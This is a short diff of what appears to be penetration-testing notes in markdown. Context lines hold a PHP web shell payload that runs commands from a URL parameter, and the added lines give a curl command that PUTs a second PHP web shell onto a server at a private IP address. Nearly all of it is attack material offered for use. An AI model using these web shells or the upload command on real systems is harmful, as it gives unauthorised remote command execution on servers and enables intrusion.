@@ -27,3 +27,8 @@ omgthissofun/<?php passthru($_GET['cmd']); ?>          # this will refeclt in /v
 ```
 pdftotext *.pdf
 ```
+
+### PUT 
+```
+ curl -X PUT -d '<?php system($_GET["c"]);?>' http://192.168.2.99/shell.ph
+```
